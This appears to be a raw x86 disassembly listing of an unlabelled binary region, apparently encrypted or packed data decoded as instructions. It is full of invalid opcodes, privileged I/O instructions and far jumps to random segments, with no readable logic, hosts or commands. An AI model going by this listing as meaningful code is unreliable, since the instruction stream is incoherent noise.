  407031:	cdq    
  407032:	mov    edi,0xf8a6593b
  407037:	mov    ch,0xbe
  407039:	xchg   esp,ecx
  40703b:	je     0x407021
  40703d:	call   0x4627:0x7b103426
  407044:	js     0x40707c
  407046:	cdq    
  407047:	sbb    al,0x9a
  407049:	pop    edx
  40704a:	add    DWORD PTR [ecx-0x13],ecx
  40704d:	inc    edx
  40704e:	inc    esi
  40704f:	jo     0x407044
  407051:	int3   
  407052:	std    
  407053:	jmp    0xbd2:0xd67f8933
  40705a:	adc    bh,BYTE PTR [esp+ecx*4+0x53700edf]
  407061:	or     edi,ebx
  407063:	lods   eax,DWORD PTR ds:[esi]
  407064:	add    dh,ah
  407066:	add    dh,BYTE PTR es:[esi]
  407069:	sar    bh,cl
  40706b:	inc    edi
  40706c:	dec    ebp
  40706d:	imul   edx,DWORD PTR [edi-0x7cbded7b],0x5b
  407074:	enter  0xff5c,0xa1
  407078:	pushf  
  407079:	xlat   BYTE PTR ds:[ebx]
  40707a:	xchg   al,ah
  40707c:	sbb    al,ah
  40707e:	mov    esp,0xb103245a
  407083:	jnp    0x407071
  407085:	ret    0xb673
  407088:	aas    
  407089:	pop    ds
  40708a:	push   ebx
  40708b:	loopne 0x40710b
  40708d:	mov    DWORD PTR [edx-0x5f239847],edi
  407093:	pop    ds
  407094:	cld    
  407095:	test   dl,0xd
  407098:	addr16 (bad) 
  40709a:	gs aas 
  40709c:	out    dx,al
  40709d:	loope  0x407118
  40709f:	outs   dx,BYTE PTR ds:[esi]
  4070a0:	shr    DWORD PTR [eax-0x43],cl
  4070a3:	leave  
  4070a4:	test   DWORD PTR [edi],eax
  4070a6:	lods   al,BYTE PTR ds:[esi]
  4070a7:	mov    ebx,0xd99e583e
  4070ac:	mov    BYTE PTR [edx-0x75],al
  4070af:	cmp    eax,0x6615921a
  4070b4:	call   0xaf86:0x3415fdb7
  4070bb:	xchg   edx,eax
  4070bc:	popf   
  4070bd:	test   eax,0xd5388e20
  4070c2:	imul   esi,DWORD PTR [ecx-0x2d00febc],0xffffffba
  4070c9:	aad    0x20
  4070cb:	sbb    eax,0xdc01c7d9
  4070d0:	ret    
  4070d1:	jns    0x40710d
  4070d3:	in     eax,dx
  4070d4:	scas   al,BYTE PTR es:[edi]
  4070d5:	inc    ecx
  4070d6:	(bad)  
  4070d8:	dec    esi
  4070d9:	xchg   BYTE PTR [edx-0x48],ch
  4070dc:	mov    ebp,0x494c447f
  4070e1:	cmc    
  4070e2:	jl     0x40706a
  4070e4:	adc    DWORD PTR [edi],ebp
  4070e6:	test   al,0xb5
  4070e8:	scas   al,BYTE PTR es:[edi]
  4070e9:	sbb    bl,BYTE PTR [ebp-0x43670171]
  4070ef:	in     eax,0xc6
  4070f1:	mov    eax,0xba8de91f
  4070f6:	mov    ah,0xca
  4070f8:	(bad)  
  4070f9:	jmp    0x3510:0x86bc4210
  407100:	imul   esi,DWORD PTR [edi-0x5f],0x52
  407104:	mov    ebp,ebp
  407106:	cmp    al,0xc1
  407108:	push   0x1b
  40710a:	dec    eax
  40710b:	cdq    
  40710c:	mov    ah,0xe4
  40710e:	into   
  40710f:	xchg   edx,eax
  407110:	retf   0xf69c
  407113:	repnz xchg ebp,eax
  407115:	dec    edi
  407116:	retf   
  407117:	icebp  
  407118:	mov    eax,ds:0xf2b19a9d
  40711d:	aaa    
  40711e:	ret    
  40711f:	aas    
  407120:	or     eax,0xe8323b4b
  407125:	adc    cl,dl
  407127:	jl     0x4070f0
  407129:	fadd   DWORD PTR [ecx+0x73]
  40712c:	ss aas 
  40712e:	push   0x56
  407130:	outs   dx,DWORD PTR ds:[esi]
  407131:	bnd ret 0x7497
  407135:	mov    WORD PTR [ebx],?
  407137:	xlat   BYTE PTR ds:[ebx]
  407138:	lahf   
  407139:	hlt    
  40713a:	cmp    al,0x1d
  40713c:	sub    al,BYTE PTR [esi+0x744db6f3]
  407142:	mov    al,0xd4
  407144:	dec    eax
  407145:	out    0x8e,eax
  407147:	dec    esp
  407148:	in     eax,dx
  407149:	jo     0x407108
  40714b:	adc    BYTE PTR [eax+eax*8],bh
  40714e:	iret   
  40714f:	inc    BYTE PTR [edx+0x30cb6c17]
  407155:	lods   eax,DWORD PTR ds:[esi]
  407156:	call   0x988613e4
  40715b:	xchg   ecx,eax
  40715c:	test   al,0xf5
  40715e:	add    cl,bl
  407160:	inc    ebp
  407161:	mov    dl,0x16
  407163:	or     al,0x8b
  407165:	push   ebx
  407166:	je     0x4071cb
  407168:	js     0x40719d
  40716a:	ror    DWORD PTR [edi-0x488ce723],0x6c
  407171:	sub    eax,0xe3410066
  407176:	mov    bl,0x76
  407178:	xor    dl,BYTE PTR [eax]
  40717a:	cmp    al,0xb6
  40717c:	cwde   
  40717d:	mov    ebp,0xed98ddba
  407182:	outs   dx,BYTE PTR ds:[esi]
  407183:	in     eax,dx
  407184:	scas   al,BYTE PTR es:[edi]
  407185:	aam    0xac
  407187:	in     al,dx
  407188:	mov    edx,0xad2749f2
  40718d:	enter  0xecde,0x96
  407191:	or     ebx,edx
  407193:	scas   eax,DWORD PTR es:[edi]
  407194:	(bad)
  407197:	inc    ebx
  407198:	push   0xfffffffd
  40719a:	adc    al,0x6e
  40719c:	mov    ch,0xe9
  40719e:	jl     0x4071d5
  4071a0:	sbb    eax,0xa5401be6
  4071a5:	scas   eax,DWORD PTR es:[edi]
  4071a6:	test   eax,0xc0571526
  4071ab:	add    ecx,ebx
  4071ad:	out    dx,eax
  4071ae:	test   ecx,esp
  4071b0:	push   es
  4071b1:	xchg   ebp,eax
  4071b2:	xchg   ecx,eax
  4071b3:	(bad)  
  4071b4:	int3   
  4071b5:	and    DWORD PTR [ebp+0x7ded180e],edx
  4071bb:	(bad)  
  4071bd:	loop   0x407167
  4071bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071c0:	jns    0x40721b
  4071c2:	push   esi
  4071c3:	push   es
  4071c4:	pop    eax
  4071c5:	test   eax,0x763385df
  4071ca:	imul   edi,DWORD PTR [esi+edx*4+0x22],0xffffff8b
  4071cf:	lds    esp,FWORD PTR [esi+0x75aa87d3]
  4071d5:	(bad)  
  4071d6:	in     eax,0x60
  4071d8:	mov    bp,0x2115
  4071dc:	js     0x40719d
  4071de:	hlt    
  4071df:	inc    ebp
  4071e0:	jmp    0xf981:0x81190483
  4071e7:	int3   
  4071e8:	ficom  DWORD PTR [ecx]
  4071ea:	js     0x407218
  4071ec:	adc    esi,esi
  4071ee:	imul   esi,DWORD PTR [esp+edx*4-0x6caf328a],0x8c240603
  4071f9:	(bad)  
  4071fa:	fidiv  DWORD PTR [ebx-0x19]
  4071fd:	ss pop esi
  4071ff:	aas    
  407200:	loope  0x4071d8
  407202:	xchg   DWORD PTR [edi],ecx
  407204:	js     0x407229
  407206:	cmp    bl,BYTE PTR [ecx+0x3ad0a24b]
  40720c:	sbb    edx,0xe87c5b6d
  407212:	xlat   BYTE PTR ds:[ebx]
  407213:	cmp    BYTE PTR [edi+0x7c7c907e],dl
  407219:	pusha  
  40721a:	ja     0x407211
  40721c:	mov    ebp,0x1722b2dd
  407221:	cmp    al,0xef
  407223:	imul   BYTE PTR [ebx+0xa8db6dd]
  407229:	push   edi
  40722a:	sub    DWORD PTR [ecx-0x25],edi
  40722d:	xchg   ecx,eax
  40722e:	test   al,0x5
  407230:	jbe    0x4071cd
  407232:	push   es
  407233:	ins    BYTE PTR es:[edi],dx
  407234:	clc    
  407235:	popa   
  407236:	mov    esp,0xa17635bc
  40723b:	mov    dh,0x6
  40723d:	push   ss
  40723e:	lock addr16 in al,0x49
  407242:	pop    esp
  407243:	ds dec esi
  407245:	data16 test al,0x96
  407248:	dec    ebx
  407249:	je     0x40728b
  40724b:	cmp    ebp,DWORD PTR [esi]
  40724d:	ficomp WORD PTR [edi+0x47d66054]
  407253:	cmp    ah,BYTE PTR [eax]
  407255:	ja     0x407270
  407257:	xchg   esp,eax
  407258:	mov    edx,0xd1f07daa
  40725d:	adc    BYTE PTR [ebp-0x40f78f0b],cl
  407263:	retf   0xbf10
  407266:	shl    DWORD PTR fs:[eax],1
  407269:	pop    ebx
  40726a:	sbb    DWORD PTR [esi-0x19],esp
  40726d:	xor    dl,dl
  40726f:	call   0xe4f4fab8
  407274:	mov    ecx,0x87468581
  407279:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40727a:	sub    eax,0x35d060ce
  40727f:	loope  0x4072db
  407281:	loope  0x4072ed
  407283:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407284:	test   BYTE PTR [ecx-0x497eac4a],0xc5
  40728b:	fs hlt 
  40728d:	pop    es
  40728e:	aad    0xba
  407290:	ret    
  407291:	xor    DWORD PTR [ebp-0x4f60c79b],eax
  407297:	ffree  st(7)
  407299:	sbb    al,0xc5
  40729b:	ins    DWORD PTR es:[edi],dx
  40729c:	cmp    ch,BYTE PTR [ebp-0x469b34b5]
  4072a2:	fdivr  st(4),st
  4072a4:	xchg   ecx,eax
  4072a5:	sbb    BYTE PTR [ebx+eax*4-0x42628b37],dh
  4072ac:	dec    ebp
  4072ad:	aad    0x54
  4072af:	je     0x407271
  4072b1:	test   eax,0xe1e38888
  4072b6:	ss hlt 
  4072b8:	cmp    cl,BYTE PTR [ebp+0x27]
  4072bb:	mov    bl,0xdd
  4072bd:	arpl   sp,si
  4072bf:	in     eax,dx
  4072c0:	sahf   
  4072c1:	inc    esp
  4072c2:	add    BYTE PTR [edx],cl
  4072c4:	dec    ebp
  4072c5:	es (bad) 
  4072c7:	neg    ebx
  4072c9:	(bad)  
  4072ca:	push   ecx
  4072cb:	fiadd  DWORD PTR [ecx+esi*8-0x2160d2c]
  4072d2:	popa   
  4072d3:	mov    edi,0x49c8d85c
  4072d8:	mov    cl,0x4f
  4072da:	shl    BYTE PTR [edi+0x4e707b8a],cl
  4072e0:	test   DWORD PTR [ebx+0xbb6c5f7],esi
  4072e6:	mov    eax,0xb46ea7c4
  4072eb:	loopne 0x40734e
  4072ed:	js     0x4072c5
  4072ef:	stos   BYTE PTR es:[edi],al
  4072f0:	xchg   DWORD PTR [ebp+0x34],ebx
  4072f3:	and    eax,0x4154efe0
  4072f8:	loope  0x40735f
  4072fa:	mov    al,0x53
  4072fc:	jno    0x407367
  4072fe:	aas    
  4072ff:	sub    DWORD PTR [ebp+0x16],esp
  407302:	mov    edx,fs
  407304:	push   ecx
  407305:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407306:	mov    esp,0x92cc8a4
  40730b:	fcomp  QWORD PTR [ecx-0x360c932c]
  407311:	popa   
  407312:	in     al,0xb9
  407314:	sbb    ah,BYTE PTR [edx+0x5a]
  407317:	into   
  407318:	xchg   edx,eax
  407319:	or     BYTE PTR [edx+0x51364700],ah
  40731f:	sub    dh,bh
  407321:	(bad)  
  407322:	test   eax,0x7c1e403b
  407327:	jno    0x4072cd
  407329:	jmp    0xb701:0x3eaeb7b1
  407330:	push   ecx
  407331:	ficomp DWORD PTR [edi+esi*4]
  407334:	inc    ebp
  407335:	loop   0x407369
  407337:	mov    BYTE PTR [edi-0x31],dh
  40733a:	lods   eax,DWORD PTR ds:[esi]
  40733b:	adc    al,BYTE PTR ds:0x97a95d86
  407341:	mov    bh,0x7
  407343:	mov    ch,0x46
  407345:	jae    0x4072e7
  407347:	push   eax
  407348:	push   eax
  407349:	jl     0x40731f
  40734b:	std    
  40734c:	push   0x49456cb9
  407351:	or     edi,DWORD PTR [edi-0x70]
  407354:	jl     0x4073a0
  407356:	cmp    eax,0xa53fc8c2
  40735b:	mov    dh,0xfd
  40735d:	push   ebx
  40735e:	sahf   
  40735f:	scas   eax,DWORD PTR es:[edi]
  407360:	push   es
  407361:	mov    cl,bh
  407363:	mov    ah,0x77
  407365:	sti    
  407366:	mov    ch,0xf2
  407368:	jle    0x407393
  40736a:	cs mov ch,0x7c
  40736d:	dec    eax
  40736e:	je     0x4073d8
  407370:	pop    ss
  407371:	jae    0x4073eb
  407373:	pop    es
  407374:	jne    0x407307
  407376:	rol    ecx,cl
  407378:	xchg   ebx,eax
  407379:	pop    ds
  40737a:	sbb    al,0x70
  40737c:	loope  0x40730c
  40737e:	inc    ebx
  40737f:	ins    BYTE PTR es:[edi],dx
  407380:	sub    ecx,DWORD PTR [edi+0x1152f54c]
  407386:	sub    al,0xc
  407388:	dec    esi
  407389:	sbb    DWORD PTR [ebx+0x74b91a7e],edx
  40738f:	sub    BYTE PTR [eax+0x1b],ah
  407392:	pop    esp
  407393:	or     cl,BYTE PTR [edi+0x5c5ef006]
  407399:	es aas 
  40739b:	add    al,0x3
  40739d:	jg     0x407397
  40739f:	ins    DWORD PTR es:[edi],dx
  4073a0:	mov    esp,0xd7733aa5
  4073a5:	fidiv  WORD PTR ds:0x7507a1aa
  4073ab:	dec    eax
  4073ac:	xchg   BYTE PTR [ebp-0x186ab278],ah
  4073b2:	enter  0x3d56,0xc3
  4073b6:	cs push cs
  4073b8:	shl    BYTE PTR ds:0xc8c77bdd,cl
  4073be:	imul   ebx,DWORD PTR [edx],0xffffffec
  4073c1:	sub    al,0x17
  4073c3:	enter  0x3eb6,0xac
  4073c7:	and    eax,0x390c6ea8
  4073cc:	adc    eax,0x1caf4c36
  4073d1:	outs   dx,DWORD PTR ds:[esi]
  4073d2:	dec    edi
  4073d3:	adc    DWORD PTR [ebp+0x51],0x4b
  4073d7:	xor    ch,cl
  4073d9:	jbe    0x407440
  4073db:	xlat   BYTE PTR ds:[ebx]
  4073dc:	ins    DWORD PTR es:[edi],dx
  4073dd:	or     al,0x17
  4073df:	dec    ecx
  4073e0:	fst    DWORD PTR [edx]
  4073e2:	(bad)  
  4073e3:	cmc    
  4073e4:	cmp    DWORD PTR [eax],ebp
  4073e6:	mov    eax,0x72c2d76c
  4073eb:	sbb    bl,BYTE PTR [esi+0x28f0bd46]
  4073f1:	jae    0x40746a
  4073f3:	cli    
  4073f4:	call   0xf016:0x2d293865
  4073fb:	add    DWORD PTR [esi+0x1d],eax
  4073fe:	imul   eax,DWORD PTR [edx+esi*4+0x7da0e774],0xfffffff7
  407406:	xlat   BYTE PTR ds:[ebx]
  407407:	out    dx,eax
  407408:	push   ds
  407409:	inc    DWORD PTR [eax-0x6b72d6b4]
  40740f:	call   0x5db4:0xd9d0a79b
  407416:	repz and ah,0x15
  40741a:	cmp    al,0xeb
  40741c:	xlat   BYTE PTR ds:[ebx]
  40741d:	add    dh,BYTE PTR [edi+0x4320c629]
  407423:	in     eax,dx
  407424:	cld    
  407425:	mov    esi,0x2b2ada6f
  40742a:	push   ecx
  40742b:	outs   dx,DWORD PTR ds:[esi]
  40742c:	aaa    
  40742d:	mov    ds:0xaaf23a3f,eax
  407432:	scas   al,BYTE PTR es:[edi]
  407433:	dec    ebx
  407434:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407435:	(bad)  
  407437:	xor    ah,ah
  407439:	imul   edi,DWORD PTR [eax],0xffffffa7
  40743c:	adc    BYTE PTR [edi],bh
  40743e:	sbb    DWORD PTR [eax-0x7e],esi
  407441:	sub    bh,0x46
  407444:	shl    esp,0xc6
  407447:	lods   al,BYTE PTR ds:[esi]
  407448:	xor    DWORD PTR [eax+ebx*1],edi
  40744b:	ins    DWORD PTR es:[edi],dx
  40744c:	mov    dh,0x56
  40744e:	xor    edx,ebp
  407450:	das    
  407451:	pop    eax
  407452:	sbb    esp,ebx
  407454:	push   ss
  407455:	xor    BYTE PTR [edx+0x7014fa24],cl
  40745b:	js     0x40741b
  40745d:	pop    ebx
  40745e:	sti    
  40745f:	sbb    DWORD PTR [edx-0x3e],esp
  407462:	je     0x40740d
  407464:	int3   
  407465:	std    
  407466:	xchg   esp,eax
  407467:	(bad)  
  407468:	jl     0x407413
  40746a:	inc    ebp
  40746b:	mov    edx,0x6df7cfff
  407470:	push   esi
  407471:	popf   
  407472:	pop    ebp
  407473:	ds xchg edx,eax
  407475:	popf   
  407476:	rcl    DWORD PTR ds:0x3e793e8e,cl
  40747c:	fcmovb st,st(4)
  40747e:	push   edx
  40747f:	push   0xffffffd2
  407481:	or     al,0x73
  407483:	xor    BYTE PTR [edi-0x7b701810],cl
  407489:	mov    ah,0xd
  40748b:	xor    ecx,ebx
  40748d:	cli    
  40748e:	sbb    eax,0x8228b783
  407493:	mov    dl,BYTE PTR [ebp+0x62]
  407496:	int3   
  407497:	rcl    ebx,0xc1
  40749a:	mov    edx,0x7711dac6
  40749f:	stc    
  4074a0:	into   
  4074a1:	popa   
  4074a2:	ror    DWORD PTR [edx],1
  4074a4:	cmp    DWORD PTR [eax+edi*1+0x5],esi
  4074a8:	fnstsw WORD PTR [esi+0x7b7604c9]
  4074ae:	lahf   
  4074af:	pop    ecx
  4074b0:	les    eax,FWORD PTR [edx+0x9954a48]
  4074b6:	xchg   edx,eax
  4074b7:	pushf  
  4074b8:	xor    ch,al
  4074ba:	mov    bl,0xae
  4074bc:	sub    al,0xf
  4074be:	sti    
  4074bf:	pop    es
  4074c0:	leave  
  4074c1:	or     esp,DWORD PTR [ebx+0x61]
  4074c4:	push   ss
  4074c5:	hlt    
  4074c6:	xchg   ecx,eax
  4074c7:	pop    ecx
  4074c8:	sub    BYTE PTR [esi+eax*2],dh
  4074cb:	jmp    0x8eba:0x75f87e64
  4074d2:	push   esi
  4074d3:	push   ebp
  4074d4:	xchg   esp,eax
  4074d5:	inc    esp
  4074d6:	cdq    
  4074d7:	inc    ebp
  4074d8:	pop    edi
  4074d9:	fiadd  DWORD PTR [esi]
  4074db:	ins    BYTE PTR es:[edi],dx
  4074dc:	mov    ebp,0xc2888f74
  4074e1:	out    dx,al
  4074e2:	mov    ebp,DWORD PTR [edx]
  4074e4:	jns    0x4074b3
  4074e6:	pop    esp
  4074e7:	adc    eax,0xf636998d
  4074ec:	imul   eax,DWORD PTR [eax-0x96a730c],0x8abb5cf7
  4074f6:	aaa    
  4074f7:	(bad)  
  4074f8:	jge    0x40756d
  4074fa:	ret    
  4074fb:	fdiv   DWORD PTR [ebx]
  4074fd:	adc    bh,ch
  4074ff:	jo     0x407525
  407501:	jle    0x407579
  407503:	call   0xca901e38
  407508:	fst    QWORD PTR [edx]
  40750a:	pop    ds
  40750b:	dec    edx
  40750c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40750d:	sbb    edi,DWORD PTR [edx+ebx*4-0x4d]
  407511:	into   
  407512:	cwde   
  407513:	push   ss
  407514:	rcr    BYTE PTR [edi+0x3d],0x63
  407518:	ror    esi,cl
  40751a:	mov    ds:0x8cf68261,al
  40751f:	adc    BYTE PTR [eax+0xfb1b7cb],bh
  407525:	rol    BYTE PTR [eax+0x528ebc85],0x25
  40752c:	push   cs
  40752d:	mov    ecx,DWORD PTR [ebp-0x6cb3985d]
  407533:	xor    al,0x89
  407535:	out    dx,eax
  407536:	xor    ecx,DWORD PTR [eax+0x58]
  407539:	xor    ah,BYTE PTR ds:0x2afe786a
  40753f:	xchg   ebp,eax
  407540:	add    dh,BYTE PTR [esi]
  407542:	int    0x12
  407544:	test   DWORD PTR [eax],edx
  407546:	xchg   edx,eax
  407547:	ja     0x407538
  407549:	jb     0x407523
  40754b:	pop    edx
  40754c:	sbb    DWORD PTR [eax],ebx
  40754e:	xchg   esi,eax
  40754f:	cli    
  407550:	inc    esp
  407551:	add    DWORD PTR [ecx+ecx*1+0x59],ecx
  407555:	jnp    0x4074fc
  407557:	adc    eax,0x52f70cd6
  40755c:	mov    esp,0x10f3fd05
  407561:	lods   al,BYTE PTR ds:[esi]
  407562:	pop    ds
  407563:	rcl    BYTE PTR [ebp+0x4b36b283],1
  407569:	jne    0x407597
  40756b:	cdq    
  40756c:	mov    ch,0xa0
  40756e:	push   ds
  40756f:	das    
  407570:	xor    al,0xfe
  407572:	popa   
  407573:	sbb    BYTE PTR [ebx-0x36],0xff
  407577:	pop    ecx
  407578:	inc    edx
  407579:	loopne 0x4075ba
  40757b:	pop    ss
  40757c:	sub    al,0xec
  40757e:	push   0x60ccb752
  407583:	retf   0xd8c0
  407586:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407587:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407588:	call   0x5f80:0x72d5c665
  40758f:	scas   eax,DWORD PTR es:[edi]
  407590:	dec    ebx
  407591:	pop    ds
  407592:	nop
  407593:	jp     0x40759f
  407595:	sub    DWORD PTR [edx+edx*8],esp
  407598:	inc    esi
  407599:	sub    DWORD PTR [ebx-0x33],eax
  40759c:	gs sbb al,0x2e
  40759f:	add    edi,ecx
  4075a1:	mov    esp,0xfcc659c0
  4075a6:	inc    edi
  4075a7:	or     eax,0xa6656c9a
  4075ac:	mov    edi,0x459a9adc
  4075b1:	call   0xf297:0xd49dc770
  4075b8:	cdq    
  4075b9:	dec    ecx
  4075ba:	int    0x56
  4075bc:	push   eax
  4075bd:	and    ecx,ebx
  4075bf:	jmp    0x245a89f9
  4075c4:	mov    bh,0x45
  4075c6:	outs   dx,BYTE PTR ds:[esi]
  4075c7:	pop    ebx
  4075c8:	xchg   edx,eax
  4075c9:	mov    ecx,0x7ef976b9
  4075ce:	xchg   edx,eax
  4075cf:	into   
  4075d0:	jae    0x407612
  4075d2:	fiadd  DWORD PTR [esi]
  4075d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4075d5:	lods   eax,DWORD PTR ds:[esi]
  4075d6:	cmc    
  4075d7:	inc    ebp
  4075d8:	sbb    BYTE PTR [ebx+0x34cd298f],0x73
  4075df:	aas    
  4075e0:	and    al,0xdb
  4075e2:	mov    ebx,DWORD PTR [edx-0x5f]
  4075e5:	push   es
  4075e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4075e7:	cmp    ch,dl
  4075e9:	into   
  4075ea:	push   ebp
  4075eb:	int3   
  4075ec:	clc    
  4075ed:	mov    ds:0x6cb94aa9,al
  4075f2:	bound  edi,QWORD PTR ds:0xfc98b06d
  4075f8:	outs   dx,BYTE PTR ds:[esi]
  4075f9:	pop    esi
  4075fa:	mov    esp,0x81388b50
  4075ff:	and    esp,edx
  407601:	unpcklps xmm5,XMMWORD PTR [ebx+ebp*4]
  407605:	hlt    
  407606:	cmp    ch,BYTE PTR [ebx]
  407608:	in     eax,0x3b
  40760a:	int3   
  40760b:	int    0x49
  40760d:	and    eax,0x3ad2af16
  407612:	test   eax,0x55bb6d14
  407617:	out    dx,eax
  407618:	adc    eax,0x3aa58110
  40761d:	add    BYTE PTR [ebx],dh
  40761f:	xchg   ebx,eax
  407620:	sbb    edx,DWORD PTR [ecx+0x62]
  407623:	xlat   BYTE PTR ds:[ebx]
  407624:	dec    ebx
  407625:	clc    
  407626:	mov    dl,BYTE PTR [edi]
  407628:	mov    edi,0x64dc4d8c
  40762d:	stos   DWORD PTR es:[edi],eax
  40762e:	add    edx,DWORD PTR [edx-0x4d]
  407631:	add    eax,0xe781035
  407636:	xchg   edi,eax
  407637:	pop    ecx
  407639:	addr16 or eax,0xf6bf0ac8
  40763f:	pop    esp
  407640:	cmp    esi,DWORD PTR [edi+ebp*2-0x349148bd]
  407647:	cld    
  407648:	push   esi
  407649:	xor    al,0x2a
  40764b:	aas    
  40764c:	scas   al,BYTE PTR es:[edi]
  40764d:	aaa    
  40764e:	enter  0x60b8,0xd1
  407652:	sub    ebp,ebp
  407654:	aas    
  407655:	subps  xmm7,XMMWORD PTR [ebp+0x444dcee8]
  40765c:	and    dl,bl
  40765e:	xor    edx,DWORD PTR [edx-0x65]
  407661:	mov    edi,0xecf6da82
  407666:	cli    
  407667:	pop    es
  407668:	jb     0x40760b
  40766a:	(bad)  
  40766b:	lea    edx,[edi]
  40766d:	pushf  
  40766e:	outs   dx,DWORD PTR ds:[esi]
  40766f:	jmp    0x5d6cd3ca
  407674:	mov    ds:0xda48334a,al
  407679:	dec    ecx
  40767a:	inc    ebx
  40767b:	mov    esp,0x40acb577
  407680:	pop    ss
  407681:	sub    edx,ebx
  407683:	scas   eax,DWORD PTR es:[edi]
  407684:	push   edx
  407685:	sub    al,0x5e
  407687:	mov    esp,0xb6323e22
  40768c:	(bad)  
  40768d:	jnp    0x40770c
  40768f:	push   0x6a
  407691:	retf   0x8100
  407694:	jp     0x4076fc
  407696:	pop    ebx
  407697:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407698:	test   al,0x58
  40769a:	mov    DWORD PTR [edi],0x47894cb
  4076a0:	aam    0xb2
  4076a2:	xchg   esi,eax
  4076a3:	retf   0x634
  4076a6:	imul   DWORD PTR [ebx+0x4dfbe04b]
  4076ac:	scas   al,BYTE PTR es:[edi]
  4076ad:	aad    0xbc
  4076af:	sbb    ebp,DWORD PTR [ebp+eax*1+0x5d]
  4076b3:	test   al,0xd6
  4076b5:	call   0x32a9:0x4e375bd5
  4076bc:	cs int3 
  4076be:	mov    DWORD PTR [ebx+esi*8+0x8d47173],esp
  4076c5:	xchg   esp,eax
  4076c6:	push   0x5dae4c3a
  4076cb:	out    0x4e,al
  4076cd:	mov    eax,DWORD PTR [esi]
  4076cf:	in     al,dx
  4076d0:	xchg   ebp,eax
  4076d1:	mov    edx,0x27db0efa
  4076d6:	nop
  4076d7:	shl    DWORD PTR [edi-0x65b7164f],cl
  4076dd:	orps   xmm4,xmm1
  4076e0:	jle    0x40773c
  4076e2:	stos   BYTE PTR es:[edi],al
  4076e3:	imul   edi,DWORD PTR [eax],0xf2f9fc8f
  4076e9:	or     al,0x77
  4076eb:	xor    BYTE PTR [ebp-0xe],al
  4076ee:	mov    bh,0xd4
  4076f0:	jno    0x40774b
  4076f2:	(bad)  
  4076f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4076f4:	xchg   ebp,eax
  4076f5:	mov    ebx,0x4edc8a81
  4076fa:	call   0x7b68c9a1
  4076ff:	inc    edx
  407700:	xor    BYTE PTR [edi],bh
  407702:	ficomp DWORD PTR [eax+eiz*4+0x897e62b]
  407709:	inc    edx
  40770a:	(bad)  
  40770b:	jp     0x407774
  40770d:	xchg   esi,eax
  40770e:	ins    DWORD PTR es:[edi],dx
  40770f:	cmp    eax,0xaf24aa73
  407714:	dec    DWORD PTR [edi]
  407716:	cmc    
  407717:	push   edx
  407718:	and    al,0x9d
  40771a:	repz add bl,BYTE PTR [esi-0x76]
  40771e:	adc    DWORD PTR [ecx],esp
  407720:	cld    
  407721:	mov    al,0xd8
  407723:	inc    esi
  407724:	clts   
  407726:	pop    ds
  407727:	aaa    
  407728:	jne    0x407738
  40772a:	jo     0x4077a4
  40772c:	popa   
  40772d:	repz adc dh,ch
  407730:	sub    BYTE PTR [edi-0x28],0x17
  407734:	cmp    eax,esi
  407736:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407737:	jmp    0x40777d
  407739:	je     0x407791
  40773b:	inc    BYTE PTR [edx-0x6c]
  40773e:	xchg   ebp,eax
  40773f:	enter  0xf587,0x10
  407743:	and    BYTE PTR [ebp-0x45aa35ce],dh
  407749:	out    dx,al
  40774a:	retf   
  40774b:	sbb    esi,DWORD PTR [ecx+0xb642930]
  407751:	pop    ecx
  407752:	inc    ebp
  407753:	(bad)  
  407754:	sub    eax,0xf049f4d3
  407759:	dec    ecx
  40775a:	lea    esp,[ebx-0x51]
  40775d:	cli    
  40775e:	out    0x6f,al
  407760:	das    
  407761:	jns    0x40773c
  407763:	sub    BYTE PTR [ecx-0x70bc8c96],ah
  407769:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40776a:	call   0x98570c54
  40776f:	mov    bl,0x12
  407771:	jbe    0x4077b4
  407773:	es dec ebp
  407775:	cmp    eax,0x7b0ba29a
  40777a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40777b:	(bad)  
  40777c:	push   ds
  40777d:	retf   0x124d
  407780:	push   ebx
  407781:	jmp    0xb592:0x7b7c9ad2
  407788:	out    0xd3,eax
  40778a:	cli    
  40778b:	sub    ebp,eax
  40778d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40778e:	repz dec edi
  407790:	fld    QWORD PTR [edx+ebp*8-0x4ecd4a00]
  407797:	aam    0xc3
  407799:	push   ebx
  40779a:	sbb    eax,0xbaeacd73
  40779f:	leave  
  4077a0:	pop    ebx
  4077a1:	xchg   ebp,eax
  4077a2:	mov    eax,ds:0xd71887be
  4077a7:	sbb    BYTE PTR [ebx-0x2c],bh
  4077aa:	cs pop ecx
  4077ac:	leave  
  4077ad:	mov    ebx,0xa6864225
  4077b2:	call   0x1fdb7077
  4077b7:	xor    eax,0x863d8f47
  4077bc:	push   ebx
  4077bd:	(bad)  [ebx-0xd]
  4077c0:	push   esp
  4077c1:	das    
  4077c2:	test   esi,ebx
  4077c4:	sub    eax,0x7a665a18
  4077c9:	add    eax,0xebe26dc4
  4077ce:	aad    0x35
  4077d0:	sub    ecx,DWORD PTR [edx]
  4077d2:	pop    edi
  4077d3:	into   
  4077d4:	shr    BYTE PTR [edx+0x3e47d953],1
  4077da:	mov    al,ds:0x344130db
  4077df:	retf   0x2b42
  4077e2:	ja     0x40781d
  4077e4:	mov    ecx,0x4707ae35
  4077e9:	pop    ds
  4077ea:	jbe    0x4077df
  4077ec:	push   DWORD PTR [ebp+0x31]
  4077ef:	xchg   BYTE PTR [edi-0x55556091],dl
  4077f5:	mov    dh,0x45
  4077f7:	mov    dh,0xf8
  4077f9:	outs   dx,DWORD PTR ds:[esi]
  4077fa:	xor    eax,0x2e9282ca
  4077ff:	cmp    ebx,DWORD PTR [ebp-0x1a]
  407802:	push   esi
  407803:	or     esp,ebp
  407805:	jp     0x407817
  407807:	(bad)  gs:[eax]
  40780a:	xchg   BYTE PTR [eax-0x7f666ea9],bh
